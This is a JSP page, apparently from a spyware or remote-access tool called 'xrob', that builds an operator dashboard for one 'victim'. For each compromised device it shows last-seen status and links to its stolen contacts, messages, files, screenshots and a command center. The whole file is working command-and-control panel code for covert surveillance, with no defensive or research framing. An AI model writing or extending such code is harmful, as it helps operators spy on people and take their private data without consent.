<%@ page import="com.theah64.xrob.api.database.tables.ClientVictimRelations" %>
<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
<%@ page import="com.theah64.xrob.api.models.MenuItem" %>
<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use FileNode | Settings | FileNode Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
    <%

    %>
    <title>Victims</title>
    <%@include file="../../common_headers.jsp" %>
    <script>
        $(document).ready(function () {
            $(".inactive").click(function () {
                alert("Not available");
            });
        });
    </script>

</head>
<body>
<div class="container">
    <%@include file="../header.jsp" %>

    <%
        try {

            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 1);
            final String victimCode = pathInfoUtils.getPart(1);
            final Victims victimsTable = Victims.getInstance();
            final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

            if (theVictim != null) {

                if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {


    %>

    <div class="row text-center">
        <ul id="nav_menu" class="breadcrumb">
            <li><a href="/client/panel">Victims</a></li>
            <li class="active"><%=theVictim.getIdentity()%>
            </li>
        </ul>
    </div>


    <div class="row">

        <div class="row">
            <div class="col-md-12">
                <h4><%=theVictim.getIdentity()%>
                    <small>
                        <%=theVictim.getRelativeLastDeliveryTime() == null ? "(Not yet seen)" : "(last seen: " + theVictim.getRelativeLastDeliveryTime() + ")" %>
                    </small>
                </h4>

            </div>
        </div>


        <%

            final MenuItem[] menuItems = new MenuItem[]{

                    new MenuItem(0, "Contacts", theVictim.getContactCount(), "/client/victim/contacts/" + victimCode),
                    new MenuItem(1, "Deliveries", theVictim.getDeliveryCount(), "/client/victim/deliveries/" + victimCode),
                    new MenuItem(2, "Command Center", theVictim.getCommandCount(), "/client/victim/command_center/" + victimCode),
                    new MenuItem(3, "File explorer", theVictim.getFileBundleCount(), "/client/victim/files/" + victimCode),

                    new MenuItem(4, "Messages", theVictim.getMessageCount(), "/client/victim/messages/" + victimCode),
                    new MenuItem(5, "File uploads", theVictim.getFileBundleCount(), "/client/victim/media/" + victimCode), //TODO: Build media display.
                    new MenuItem(6, "Screen shots", theVictim.getMediaScreenShotCount(), "/client/victim/media/screen_shots/" + victimCode),
            };


            for (int i = 0; i < menuItems.length; i++) {


                final MenuItem menuItem = menuItems[i];
        %>

        <div class="col-md-3" style="margin-bottom: 10px">
            <%
                if (menuItem.getMenuId() == 2) {

            %>
            <a href="<%=theVictim.getFCMId()!=null ? menuItem.getLink() : "#"%>">
                <div class="profile_grid <%=theVictim.getFCMId()==null ? "inactive" : ""%>">
                    <p class="profile_grid_main_title"><%=menuItem.getCount()%>
                    </p>

                    <p class="profile_grid_sub_title"><%=menuItem.getTitle()%>
                    </p>
                </div>
            </a>
            <%

            } else {
            %>
            <a href="<%=menuItem.getCount() > 0 ? menuItem.getLink() : "#"%>">
                <div class="profile_grid <%=menuItem.getCount()<=0 ? "inactive" : ""%>">
                    <p class="profile_grid_main_title"><%=menuItem.getCount()%>
                    </p>

                    <p class="profile_grid_sub_title"><%=menuItem.getTitle()%>
                    </p>
                </div>
            </a>
            <%
                }
            %>


        </div>

        <%

            }
        %>


        <%

            } else {
                throw new PathInfo.PathInfoException("No connection established with this victim");
            }

        %>
    </div>

    <%
        } else {
            throw new PathInfo.PathInfoException("Invalid victim code " + victimCode);
        }
    } catch (PathInfo.PathInfoException e) {
        e.printStackTrace();
    %>
    <%=HtmlTemplates.getErrorHtml(e.getMessage())%>
    <%
        }
    %>


</div>
</body>
</html>
